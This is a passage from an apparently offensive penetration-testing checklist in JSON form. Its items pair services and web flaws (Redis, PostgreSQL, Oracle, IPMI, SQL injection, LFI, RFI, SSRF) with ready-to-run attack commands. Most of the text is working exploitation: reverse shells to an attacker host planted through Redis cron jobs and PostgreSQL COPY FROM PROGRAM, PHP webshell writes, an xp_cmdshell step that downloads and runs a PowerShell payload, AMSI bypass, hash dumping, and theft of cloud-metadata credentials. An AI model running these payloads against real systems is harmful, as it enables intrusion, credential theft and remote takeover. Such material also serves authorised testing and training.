        "code": "# Check WinRM\ncrackmapexec winrm <TARGET_IP> -u <USER> -p <PASS>\ncrackmapexec winrm <TARGET_IP> -u <USER> -H <NTLM_HASH>\n\n# evil-winrm (most feature-rich)\nevil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'\nevil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>\nevil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -s /opt/ps_scripts/ -e /opt/exes/\nevil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -S  # HTTPS (5986)\n\n# Upload/download in evil-winrm\nevil-winrm> upload /local/file C:\\remote\\path\nevil-winrm> download C:\\remote\\file /local/path\nevil-winrm> Bypass-4MSI       # AMSI bypass\nevil-winrm> menu              # load PS scripts\n\n# PowerShell remoting (Windows)\n$cred = New-Object System.Management.Automation.PSCredential('<USER>', (ConvertTo-SecureString '<PASS>' -AsPlainText -Force))\nNew-PSSession -ComputerName <TARGET_IP> -Credential $cred\nEnter-PSSession -ComputerName <TARGET_IP> -Credential $cred\n\n# Invoke-Command\nInvoke-Command -ComputerName <TARGET_IP> -Credential $cred -ScriptBlock { whoami }"
      }
    ],
    "brief_description": "evil-winrm is the best WinRM client — supports AMSI bypass, PS scripts, file transfers, and hash auth."
  },

  // --- RPC (135/111) ---
  {
    "id": "item-40",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.16 RPC/RPCBind (111/135)",
    "title": "RPC enumeration",
    "feasible_when": "port 135 (Windows MSRPC) or port 111 (RPCBind/Linux) is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# rpcclient null session\nrpcclient -U '' -N <TARGET_IP>\nrpcclient -U '<USER>%<PASS>' <TARGET_IP>\n\n# rpcclient commands\nrpcclient <TARGET_IP> -U '' -N -c 'enumdomusers'\nrpcclient <TARGET_IP> -U '' -N -c 'enumdomgroups'\nrpcclient <TARGET_IP> -U '' -N -c 'querydominfo'\nrpcclient <TARGET_IP> -U '' -N -c 'srvinfo'\nrpcclient <TARGET_IP> -U '' -N -c 'enumprivs'\nrpcclient <TARGET_IP> -U '' -N -c 'netshareenumall'\nrpcclient <TARGET_IP> -U '' -N -c 'getdompwinfo'\n# Get user info by RID\nrpcclient <TARGET_IP> -U '' -N -c 'queryuser 0x1f4'  # RID 500 = Administrator\n# RID cycling\nfor i in $(seq 500 1200); do rpcclient -U '' -N <TARGET_IP> -c \"queryuser 0x$(printf '%x' $i)\" 2>/dev/null | grep 'User Name'; done\n\n# List RPC services\nrpcinfo -p <TARGET_IP>\n\n# impacket rpcdump\nimpacket-rpcdump <TARGET_IP>\nimpacket-rpcdump <TARGET_IP> | grep -iE 'spoolsv|spooler|RemoteRegistry|WinReg'\n\n# nmap\nnmap -p 135 --script='msrpc-enum' <TARGET_IP>\nnmap -p 111,135 --script='rpcinfo' <TARGET_IP>"
      }
    ],
    "brief_description": "RPC null sessions enumerate domain users via RID cycling. rpcdump reveals attack surfaces like PrintSpoofer."
  },

  // --- Redis (6379) ---
  {
    "id": "item-41",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.17 Redis (6379)",
    "title": "Redis enumeration & exploitation",
    "feasible_when": "port 6379 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Basic info\nredis-cli -h <TARGET_IP> INFO\nredis-cli -h <TARGET_IP> INFO server\nredis-cli -h <TARGET_IP> CONFIG GET *\nredis-cli -h <TARGET_IP> KEYS '*'\nredis-cli -h <TARGET_IP> DBSIZE\nnmap -p 6379 --script='redis-info,redis-brute' <TARGET_IP>\n\n# Authenticated\nredis-cli -h <TARGET_IP> -a '<PASSWORD>' INFO\n\n# Get all key values\nredis-cli -h <TARGET_IP> --scan | while read key; do echo \"$key: $(redis-cli -h <TARGET_IP> GET $key)\"; done\n\n# RCE via SSH key write\nredis-cli -h <TARGET_IP> CONFIG SET dir /root/.ssh/\nredis-cli -h <TARGET_IP> CONFIG SET dbfilename authorized_keys\nredis-cli -h <TARGET_IP> SET pwn \"\\n\\n$(cat ~/.ssh/id_rsa.pub)\\n\\n\"\nredis-cli -h <TARGET_IP> BGSAVE\nssh root@<TARGET_IP>\n\n# RCE via cron job\nredis-cli -h <TARGET_IP> CONFIG SET dir /var/spool/cron/crontabs/\nredis-cli -h <TARGET_IP> CONFIG SET dbfilename root\nredis-cli -h <TARGET_IP> SET cron \"\\n\\n* * * * * bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\\n\\n\"\nredis-cli -h <TARGET_IP> BGSAVE\n\n# RCE via webshell write\nredis-cli -h <TARGET_IP> CONFIG SET dir /var/www/html/\nredis-cli -h <TARGET_IP> CONFIG SET dbfilename cmd.php\nredis-cli -h <TARGET_IP> SET pwn '<?php system($_GET[\"cmd\"]);?>'\nredis-cli -h <TARGET_IP> BGSAVE"
      }
    ],
    "brief_description": "Unauthenticated Redis = critical RCE — write SSH keys, cron jobs, or webshells directly."
  },

  // --- MongoDB (27017) ---
  {
    "id": "item-42",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.18 MongoDB (27017)",
    "title": "MongoDB enumeration",
    "feasible_when": "port 27017 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Connect (no auth)\nmongosh <TARGET_IP>  # newer client\nmongo <TARGET_IP>     # older client\n  show dbs\n  use admin\n  show collections\n  db.users.find().pretty()\n  db.getUsers()\n  db.getSiblingDB('admin').getUsers()\n  db.getCollectionNames()\n\n# nmap scripts\nnmap -p 27017 --script='mongodb-info,mongodb-databases' <TARGET_IP>\n\n# mongodump — backup all databases\nmongodump --host <TARGET_IP> --out /tmp/mongodump/ --authenticationDatabase admin\n\n# Specific collection dump\nmongodump --host <TARGET_IP> --db <DBNAME> --collection users --out /tmp/dump/\n\n# One-liner check\nmongo --host <TARGET_IP> --eval 'db.adminCommand({listDatabases: 1})' --quiet\n\n# Python check\npython3 -c \"\nimport pymongo\nclient = pymongo.MongoClient('<TARGET_IP>', 27017)\nprint(client.list_database_names())\n\""
      }
    ],
    "brief_description": "Unauthenticated MongoDB dumps all databases — look for user collections with password hashes."
  },

  // --- PostgreSQL (5432) ---
  {
    "id": "item-43",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.19 PostgreSQL (5432)",
    "title": "PostgreSQL enumeration & RCE",
    "feasible_when": "port 5432 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Connect\npsql -h <TARGET_IP> -U postgres\npsql -h <TARGET_IP> -U postgres -d <DBNAME>\npsql postgresql://postgres:<PASS>@<TARGET_IP>/postgres\n\n# nmap brute\nnmap -p 5432 --script='pgsql-brute' <TARGET_IP>\nhydra -L users.txt -P passwords.txt postgres://<TARGET_IP>\n\n# Enum commands\n\\l                   -- list databases\n\\c <DBNAME>          -- connect to DB\n\\dt                  -- list tables\n\\du                  -- list users\nSELECT usename, passwd FROM pg_shadow;  -- get hashes\nSELECT version();\nSHOW hba_file;       -- pg_hba.conf location\n\n# OS command execution (superuser)\nDROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';\nSELECT * FROM cmd_exec;\nCOPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1';\n\n# Read files\nCREATE TABLE filedump(content text);\nCOPY filedump FROM '/etc/passwd';\nSELECT * FROM filedump;\n\n# Write files (if pg_write_server_files priv)\nCOPY (SELECT '<?php system($_GET[\"cmd\"]);?>') TO '/var/www/html/cmd.php';"
      }
    ],
    "brief_description": "PostgreSQL COPY FROM PROGRAM executes OS commands as the postgres user — check for superuser privileges first."
  },

  // --- Elasticsearch (9200) ---
  {
    "id": "item-44",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.20 Elasticsearch (9200/9300)",
    "title": "Elasticsearch enumeration",
    "feasible_when": "port 9200 or 9300 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Basic info\ncurl -s http://<TARGET_IP>:9200/\ncurl -s http://<TARGET_IP>:9200/_cat/indices?v\ncurl -s http://<TARGET_IP>:9200/_cat/nodes?v\ncurl -s http://<TARGET_IP>:9200/_cluster/health?pretty\ncurl -s http://<TARGET_IP>:9200/_cluster/settings?pretty\ncurl -s http://<TARGET_IP>:9200/_nodes?pretty\n\n# Dump all data\ncurl -s http://<TARGET_IP>:9200/_all/_search?size=1000&pretty\ncurl -s 'http://<TARGET_IP>:9200/<INDEX>/_search?size=1000&pretty'\n\n# List indices and search\ncurl -s 'http://<TARGET_IP>:9200/_cat/indices?v&h=index,docs.count'\ncurl -s 'http://<TARGET_IP>:9200/<INDEX>/_mapping?pretty'\n\n# Get specific index data\ncurl -s 'http://<TARGET_IP>:9200/<INDEX>/_search' -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}},\"size\":100}' | python3 -m json.tool\n\n# Check for CVE-2015-1427 Groovy sandbox escape (ES < 1.6)\ncurl -XPOST 'http://<TARGET_IP>:9200/_search?pretty' -d '{\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"cmd\":{\"script\":\"java.lang.Runtime.getRuntime().exec(\\\"id\\\").text\"}}}'  "
      }
    ],
    "brief_description": "Unauthenticated Elasticsearch exposes all indexed data — dump every index for credentials and sensitive info."
  },

  // --- Oracle (1521) ---
  {
    "id": "item-45",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.21 Oracle DB (1521)",
    "title": "Oracle database enumeration",
    "feasible_when": "port 1521 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# SID enumeration\nnmap -p 1521 --script='oracle-sid-brute,oracle-brute,oracle-enum-users' <TARGET_IP>\noscanner -s <TARGET_IP> -P 1521\nodat sidguesser -s <TARGET_IP>\n\n# ODAT (Oracle Database Attack Tool) — comprehensive\nodat all -s <TARGET_IP>\nodat sidguesser -s <TARGET_IP>\nodat passwordguesser -s <TARGET_IP> -d <SID>\nodat utlfile -s <TARGET_IP> -d <SID> -U <USER> -P <PASS> --sysdba --getFile /etc/passwd /tmp/passwd\nodat dbmsxslprocessor -s <TARGET_IP> -d <SID> -U <USER> -P <PASS> --putFile /var/www/html cmd.php '<FILE>'\n\n# SQLPlus connection\nsqlplus <USER>/<PASS>@<TARGET_IP>:1521/<SID>\nsqlplus <USER>/<PASS>@<TARGET_IP>:1521/<SID> as sysdba\n\n# Common default creds\n# sys:change_on_install, sys:manager, system:manager, scott:tiger, dbsnmp:dbsnmp\n\n# Basic queries\nSELECT username FROM all_users;\nSELECT * FROM user_role_privs;\nSELECT * FROM session_privs;\n\n# RCE via Java (if JAVA enabled)\nSELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c whoami') FROM dual;"
      }
    ],
    "brief_description": "Oracle requires SID enumeration first. ODAT automates all attack paths including file read/write and RCE."
  },

  // --- Memcached (11211) ---
  {
    "id": "item-46",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.22 Memcached (11211)",
    "title": "Memcached enumeration",
    "feasible_when": "port 11211 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Basic stats\nnc -nv <TARGET_IP> 11211 << 'EOF'\nstats\nstats items\nstats slabs\nstats cachedump 1 100\nquit\nEOF\n\n# Get specific cached item\necho -e 'get <KEY>\\r' | nc -q 1 <TARGET_IP> 11211\n\n# Dump all keys (Python)\npython3 -c \"\nimport socket, sys\ns = socket.socket()\ns.connect(('<TARGET_IP>', 11211))\ns.send(b'stats items\\r\\n')\nprint(s.recv(4096).decode())\n\"\n\n# nmap\nnmap -p 11211 --script='memcached-info' <TARGET_IP>"
      }
    ],
    "brief_description": "Unauthenticated Memcached can expose session tokens, cached credentials, and application data."
  },

  // --- IPMI (623 UDP) ---
  {
    "id": "item-47",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.23 IPMI/BMC (623 UDP)",
    "title": "IPMI enumeration & hash retrieval",
    "feasible_when": "UDP port 623 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# IPMI discovery\nnmap -sU -p 623 --script='ipmi-version,ipmi-cipher-zero' <TARGET_IP>\n\n# MSF — IPMI hash retrieval (no auth needed on vulnerable systems)\nmsf: use auxiliary/scanner/ipmi/ipmi_dumphashes\nset RHOSTS <TARGET_IP>; run\n\n# Crack IPMI hashes\nhashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Check cipher zero (auth bypass)\nmsf: use auxiliary/scanner/ipmi/ipmi_cipher_zero\nset RHOSTS <TARGET_IP>; run\n\n# ipmitool\nipmitool -I lanplus -H <TARGET_IP> -U admin -P admin user list\nipmitool -I lanplus -H <TARGET_IP> -U admin -P admin chassis status"
      }
    ],
    "brief_description": "IPMI cipher zero allows passwordless login. Hash retrieval via MSF dumps credentials without authentication."
  },

  // --- VNC (5900) ---
  {
    "id": "item-48",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.24 VNC (5900/5901)",
    "title": "VNC enumeration & brute-force",
    "feasible_when": "port 5900 or 5901 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# nmap\nnmap -p 5900,5901 --script='vnc-info,vnc-brute,vnc-title' <TARGET_IP>\n\n# Brute-force\nhydra -P /usr/share/wordlists/rockyou.txt vnc://<TARGET_IP> -t 1\nmedusa -h <TARGET_IP> -P passwords.txt -M vnc\n\n# Connect\nvncviewer <TARGET_IP>::5900\nvncviewer -passwd vnc_passwd_file <TARGET_IP>::5900\ntigervnc <TARGET_IP>::5900\n\n# Password hash location\n# ~/.vnc/passwd (DES encrypted)\nvncrack -P passwords.txt /path/to/vnc/passwd\n\n# Extract saved VNC password\ncat ~/.vnc/passwd | xxd"
      }
    ],
    "brief_description": "VNC with no authentication or weak passwords gives a full GUI desktop — always try blank password first."
  },

  // ============================================================
  // PHASE 4 — VULNERABILITY ANALYSIS
  // ============================================================
  {
    "id": "item-49",
    "phase": "4. Vulnerability Analysis",
    "step": "",
    "title": "Search for exploits based on service versions",
    "feasible_when": "Service versions have been identified from port/banner scans.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# searchsploit (local ExploitDB)\nsearchsploit '<SERVICE>' '<VERSION>'\nsearchsploit -m <EXPLOIT_ID>    # copy to current dir\nsearchsploit -x <EXPLOIT_ID>    # view code\nsearchsploit --update           # update DB\nsearchsploit -t 'remote'        # type filter\nsearchsploit '<SERVICE>' '<VERSION>' --exclude='dos\\|DoS'\n\n# Nmap vuln scripts\nnmap --script=vuln -p <PORTS> <TARGET_IP>\nnmap --script=vulners --script-args mincvss=7.0 -sV <TARGET_IP>\nnmap --script=vulscan --script-args vulscandb=exploitdb.csv -sV <TARGET_IP>\n\n# Online resources:\n# https://www.exploit-db.com/\n# https://www.cvedetails.com/\n# https://nvd.nist.gov/vuln/search\n# https://github.com search: <service> <version> exploit OR PoC\n# https://packetstormsecurity.com/\n# https://vulhub.org/\n# https://www.rapid7.com/db/\n# https://snyk.io/vuln/\n# https://vulners.com/\n\n# Check for known CVEs in installed software\nnmap -sV --script=vulners <TARGET_IP> -oX vulns.xml\n\n# Default credentials database:\n# https://www.cirt.net/passwords\n# https://default-password.info/\n# https://datarecovery.com/rd/default-passwords/"
      }
    ],
    "brief_description": "Map every service version to known CVEs before exploiting manually — searchsploit + online search + Metasploit."
  },
 {
    "id": "item-50",
    "phase": "5. Exploitation",
    "step": "5.1 SQL Injection",
    "title": "SQL Injection — detection & exploitation",
    "feasible_when": "A web application passes user input to database queries (login forms, search fields, URL params, cookies).",
    "snippets": [
      {
        "lang": "bash",
        "code": "# sqlmap — automated\nsqlmap -u 'http://<TARGET_IP>/page?id=1' --batch --dbs\nsqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DBNAME> --tables\nsqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DBNAME> -T <TABLE> --dump\nsqlmap -u 'http://<TARGET_IP>/page?id=1' --os-shell\nsqlmap -r request.txt --batch --dbs           # from Burp saved request\nsqlmap -u 'http://<TARGET_IP>/page' --data='user=admin&pass=test' --batch --dbs  # POST\nsqlmap -u 'http://<TARGET_IP>/page?id=1' --cookie='session=<VALUE>' --batch --dbs\nsqlmap -u 'http://<TARGET_IP>/page?id=1' --level=5 --risk=3 --batch --dbs  # aggressive\nsqlmap -u 'http://<TARGET_IP>/page?id=1' --technique=BEUSTQ --batch  # all techniques\nsqlmap -u 'http://<TARGET_IP>/page?id=1' --proxy=http://127.0.0.1:8080 --batch  # through Burp\n\n# Manual detection payloads\n'                          # single quote — causes error\n''                         # double single quote — may bypass\n1 AND 1=1                  # boolean true\n1 AND 1=2                  # boolean false (page changes)\n1' AND '1'='1              # string context\n1' AND '1'='2              # string context false\n1; SELECT sleep(5)--       # time-based\n' OR SLEEP(5)--\n1 WAITFOR DELAY '0:0:5'--  # MSSQL time-based\n1; SELECT pg_sleep(5)--    # PostgreSQL time-based\n\n# UNION-based (find column count first)\n' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--             # error when exceeding column count\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--\n\n# Data extraction\n' UNION SELECT username,password,3 FROM users--\n' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--\n' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--\n\n# MySQL file operations\n' UNION SELECT load_file('/etc/passwd'),2,3--\n' INTO OUTFILE '/var/www/html/cmd.php' LINES TERMINATED BY '<?php system($_GET[\"c\"]);?>'--\n\n# MSSQL command execution\n'; EXEC xp_cmdshell('whoami')--\n'; EXEC xp_cmdshell('powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''http://<ATTACKER_IP>/rev.ps1'')'')--\n\n# Stacked queries\n'; INSERT INTO users VALUES ('hacker','hacker123')--\n\n# Second-order SQLi\n# Register with: admin'--  → triggers when profile is loaded"
      }
    ],
    "brief_description": "Test all input fields including cookies and headers. Use time-based blind when no output is visible."
  },
  {
    "id": "item-51",
    "phase": "5. Exploitation",
    "step": "5.1 SQL Injection",
    "title": "NoSQL Injection (MongoDB)",
    "feasible_when": "A web application uses MongoDB or another NoSQL database and passes user input to queries.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Authentication bypass\n# POST body injection\nusername=admin&password[$ne]=wrongpass\nusername=admin&password[$regex]=.*\nusername[$ne]=invalid&password[$ne]=invalid\n\n# JSON payload\n{\"username\": \"admin\", \"password\": {\"$ne\": \"wrongpass\"}}\n{\"username\": {\"$regex\": \"adm.*\"}, \"password\": {\"$ne\": \"\"}}\n{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}\n\n# URL parameter injection\ncurl 'http://<TARGET_IP>/login?username=admin&password[$ne]=x'\ncurl 'http://<TARGET_IP>/login?username[$regex]=admin&password[$ne]=x'\n\n# Data exfiltration via regex\ncurl -d '{\"username\":{\"$regex\":\"^a\"},\"password\":{\"$ne\":\"x\"}}' -H 'Content-Type: application/json' http://<TARGET_IP>/api/login\n# Binary search for password length, then char by char\n\n# Tools\nnmap -p 27017 --script=mongodb-brute <TARGET_IP>\nnmap -p 27017 --script=mongodb-databases <TARGET_IP>"
      }
    ],
    "brief_description": "NoSQL injection uses operator injection ($ne, $gt, $regex) instead of SQL syntax — common in Node.js apps."
  },
  {
    "id": "item-52",
    "phase": "5. Exploitation",
    "step": "5.2 Local File Inclusion (LFI)",
    "title": "LFI — file read & exploitation",
    "feasible_when": "A web app accepts a filename/path parameter (e.g., ?page=, ?file=, ?include=, ?path=).",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Basic LFI\ncurl 'http://<TARGET_IP>/page?file=../../../../etc/passwd'\ncurl 'http://<TARGET_IP>/page?file=../../../../etc/shadow'\ncurl 'http://<TARGET_IP>/page?file=../../../../etc/hosts'\ncurl 'http://<TARGET_IP>/page?file=../../../../proc/self/environ'\ncurl 'http://<TARGET_IP>/page?file=../../../../var/log/apache2/access.log'\ncurl 'http://<TARGET_IP>/page?file=../../../../var/log/nginx/access.log'\ncurl 'http://<TARGET_IP>/page?file=../../../../var/log/auth.log'\ncurl 'http://<TARGET_IP>/page?file=../../../../home/<USER>/.ssh/id_rsa'\ncurl 'http://<TARGET_IP>/page?file=../../../../root/.ssh/id_rsa'\n\n# Path traversal variants\ncurl 'http://<TARGET_IP>/page?file=....//....//....//etc/passwd'\ncurl 'http://<TARGET_IP>/page?file=..%2F..%2F..%2Fetc%2Fpasswd'\ncurl 'http://<TARGET_IP>/page?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd'\ncurl 'http://<TARGET_IP>/page?file=....\\\\....\\\\etc\\\\passwd'\ncurl 'http://<TARGET_IP>/page?file=..././..././..././etc/passwd'\ncurl 'http://<TARGET_IP>/page?file=/etc/passwd%00'  # null byte (old PHP)\ncurl 'http://<TARGET_IP>/page?file=php://filter/read=string.rot13/resource=index.php'\n\n# PHP wrappers\ncurl 'http://<TARGET_IP>/page?file=php://filter/convert.base64-encode/resource=index.php'\ncurl 'http://<TARGET_IP>/page?file=php://filter/convert.base64-encode/resource=<FILE>' | base64 -d\ncurl 'http://<TARGET_IP>/page?file=php://input' -d '<?php system(\"id\"); ?>'\ncurl 'http://<TARGET_IP>/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==&cmd=id'\ncurl 'http://<TARGET_IP>/page?file=expect://id'\ncurl 'http://<TARGET_IP>/page?file=zip://shell.zip%23shell.php'\n\n# Windows targets\ncurl 'http://<TARGET_IP>/page?file=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'\ncurl 'http://<TARGET_IP>/page?file=C:\\windows\\win.ini'\ncurl 'http://<TARGET_IP>/page?file=C:\\inetpub\\wwwroot\\web.config'\ncurl 'http://<TARGET_IP>/page?file=C:\\Windows\\System32\\winevt\\Logs\\Application.evtx'\n\n# ffuf LFI fuzzing\nffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://<TARGET_IP>/page?file=FUZZ' -fs <DEFAULT_SIZE>"
      }
    ],
    "brief_description": "LFI reads sensitive files. Always try PHP wrappers — base64 filter reads PHP source without executing it."
  },
  {
    "id": "item-53",
    "phase": "5. Exploitation",
    "step": "5.2 Local File Inclusion (LFI)",
    "title": "LFI → RCE via log poisoning & other methods",
    "feasible_when": "LFI is confirmed and log files are readable via the inclusion.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Apache log poisoning (poison via User-Agent)\ncurl -A '<?php system($_GET[\"cmd\"]); ?>' http://<TARGET_IP>/\ncurl 'http://<TARGET_IP>/page?file=/var/log/apache2/access.log&cmd=id'\ncurl 'http://<TARGET_IP>/page?file=/var/log/apache2/error.log&cmd=id'\n\n# Nginx log poisoning\ncurl -A '<?php system($_GET[\"cmd\"]); ?>' http://<TARGET_IP>/\ncurl 'http://<TARGET_IP>/page?file=/var/log/nginx/access.log&cmd=id'\n\n# Auth log poisoning via SSH (poison username)\nssh '<?php system($_GET[\"cmd\"]); ?>'@<TARGET_IP>\ncurl 'http://<TARGET_IP>/page?file=/var/log/auth.log&cmd=id'\n\n# PHP session poisoning\n# 1. Find session via phpinfo\ncurl 'http://<TARGET_IP>/page?file=php://filter/convert.base64-encode/resource=/var/lib/php/sessions/sess_<SESSION_ID>'\n# 2. Set malicious session data in a parameter that gets stored\n# 3. Include session file\ncurl 'http://<TARGET_IP>/page?file=/var/lib/php/sessions/sess_<SESSION_ID>&cmd=id'\n\n# /proc/self/environ poisoning\ncurl -A '<?php system($_GET[\"cmd\"]); ?>' http://<TARGET_IP>/\ncurl 'http://<TARGET_IP>/page?file=/proc/self/environ&cmd=id'\n\n# /proc/self/fd enumeration\nfor i in $(seq 0 20); do curl -s 'http://<TARGET_IP>/page?file=/proc/self/fd/'$i | head -5; echo \"=== fd/$i ===\"; done\n\n# Email log poisoning\n# Send mail to target with <?php system($_GET['cmd']); ?> in headers\nswaks --to 'user@<DOMAIN>' --from 'attacker@evil.com' --server <TARGET_IP> --header 'X-PHP: <?php system($_GET[\"cmd\"]);?>'\ncurl 'http://<TARGET_IP>/page?file=/var/mail/user&cmd=id'\n\n# SMTP log injection\nnc <TARGET_IP> 25\n  MAIL FROM: '<?php system($_GET[\"cmd\"]); ?>'\ncurl 'http://<TARGET_IP>/page?file=/var/log/mail.log&cmd=id'"
      }
    ],
    "brief_description": "Log poisoning converts LFI to RCE — inject PHP into a log file then include it. Auth log via SSH is reliable."
  },
  {
    "id": "item-54",
    "phase": "5. Exploitation",
    "step": "5.3 Remote File Inclusion (RFI)",
    "title": "Remote File Inclusion",
    "feasible_when": "LFI is confirmed AND PHP allow_url_include=On OR allow_url_fopen=On.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Verify allow_url_include status\ncurl 'http://<TARGET_IP>/phpinfo.php' | grep 'allow_url_include'\ncurl 'http://<TARGET_IP>/page?file=php://filter/convert.base64-encode/resource=../php.ini' | base64 -d | grep allow_url\n\n# Host malicious PHP file\ncat > /tmp/shell.php << 'EOF'\n<?php system($_GET['cmd']); ?>\nEOF\npython3 -m http.server 80\n\n# RFI payloads\ncurl 'http://<TARGET_IP>/page?file=http://<ATTACKER_IP>/shell.php&cmd=id'\ncurl 'http://<TARGET_IP>/page?file=http://<ATTACKER_IP>/shell.php%3Fcmd%3Did'\ncurl 'http://<TARGET_IP>/page?file=http://<ATTACKER_IP>/shell.php%00'  # null byte bypass\ncurl 'http://<TARGET_IP>/page?file=ftp://anonymous:anonymous@<ATTACKER_IP>/shell.php'\n\n# FTP-based RFI (if allow_url_include blocks http)\npython3 -m pyftpdlib -p 21 -u anonymous -P anonymous -d /tmp/\ncurl 'http://<TARGET_IP>/page?file=ftp://<ATTACKER_IP>/shell.php'\n\n# SMB-based RFI (Windows)\nimpacket-smbserver share /tmp/ -smb2support\ncurl 'http://<TARGET_IP>/page?file=\\\\<ATTACKER_IP>\\share\\shell.php'"
      }
    ],
    "brief_description": "RFI requires allow_url_include=On — host a PHP shell on your attack machine and include it remotely."
  },
  {
    "id": "item-55",
    "phase": "5. Exploitation",
    "step": "5.4 Server-Side Request Forgery (SSRF)",
    "title": "SSRF — internal service access & cloud metadata",
    "feasible_when": "A web app fetches URLs or resources based on user-supplied input (URL parameter, webhook, PDF generator, image fetcher).",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Basic SSRF detection\ncurl 'http://<TARGET_IP>/page?url=http://<ATTACKER_IP>/test'  # check listener\ncurl 'http://<TARGET_IP>/fetch?url=http://127.0.0.1/'\ncurl 'http://<TARGET_IP>/fetch?url=http://localhost/'\ncurl 'http://<TARGET_IP>/fetch?url=http://0.0.0.0/'\ncurl 'http://<TARGET_IP>/img?src=http://127.0.0.1:8080/'\n\n# Cloud metadata (try all if unsure which cloud)\ncurl 'http://<TARGET_IP>/fetch?url=http://169.254.169.254/latest/meta-data/'  # AWS EC2\ncurl 'http://<TARGET_IP>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'  # AWS IAM\ncurl 'http://<TARGET_IP>/fetch?url=http://169.254.169.254/computeMetadata/v1/'  # GCP (needs header)\ncurl 'http://<TARGET_IP>/fetch?url=http://metadata.google.internal/computeMetadata/v1/'  # GCP\ncurl 'http://<TARGET_IP>/fetch?url=http://169.254.169.254/metadata/v1/'  # DigitalOcean\ncurl 'http://<TARGET_IP>/fetch?url=http://169.254.169.254/metadata/instance'  # Azure\ncurl 'http://<TARGET_IP>/fetch?url=http://100.100.100.200/latest/meta-data/'  # Alibaba\n\n# Internal service discovery\nfor port in 21 22 23 25 80 443 3306 3389 5432 5900 6379 8080 8443 27017; do\n  echo -n \"Port $port: \"\n  curl -sk -o /dev/null -w '%{http_code}' --max-time 2 \"http://<TARGET_IP>/fetch?url=http://127.0.0.1:$port/\"\n  echo\ndone\n\n# SSRF bypass techniques\n# Bypass with redirects\ncurl 'http://<TARGET_IP>/fetch?url=http://<ATTACKER_IP>/redirect'  # serve 302 to internal\npython3 -c \"\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nclass H(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(302)\n        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')\n        self.end_headers()\nHTTPServer(('0.0.0.0', 80), H).serve_forever()\"\n\n# Bypass filters\ncurl 'http://<TARGET_IP>/fetch?url=http://2130706433/'      # 127.0.0.1 in decimal\ncurl 'http://<TARGET_IP>/fetch?url=http://0x7f000001/'     # 127.0.0.1 in hex\ncurl 'http://<TARGET_IP>/fetch?url=http://127.1/'          # short form\ncurl 'http://<TARGET_IP>/fetch?url=http://[::1]/'          # IPv6 localhost\ncurl 'http://<TARGET_IP>/fetch?url=http://localtest.me/'   # DNS → 127.0.0.1\ncurl 'http://<TARGET_IP>/fetch?url=http://spoofed.<ATTACKER_IP>.nip.io/'  # nip.io DNS\n\n# Protocol schemes for SSRF\ncurl 'http://<TARGET_IP>/fetch?url=file:///etc/passwd'     # file protocol\ncurl 'http://<TARGET_IP>/fetch?url=dict://127.0.0.1:6379/info'  # dict → Redis\ncurl 'http://<TARGET_IP>/fetch?url=gopher://127.0.0.1:6379/_%2a1%0d%0a%248%0d%0aFLUSHALL%0d%0a'  # gopher → Redis\ncurl 'http://<TARGET_IP>/fetch?url=gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM'  # gopher → SMTP\n\n# Blind SSRF detection with Burp Collaborator / interactsh\ncurl 'http://<TARGET_IP>/fetch?url=http://<COLLAB_URL>/'\ninteractsh-client  # setup listener"
      }
    ],
    "brief_description": "SSRF can reach internal services and cloud metadata — always try cloud metadata endpoints and internal port scan."
  },
  {
    "id": "item-56",
    "phase": "5. Exploitation",
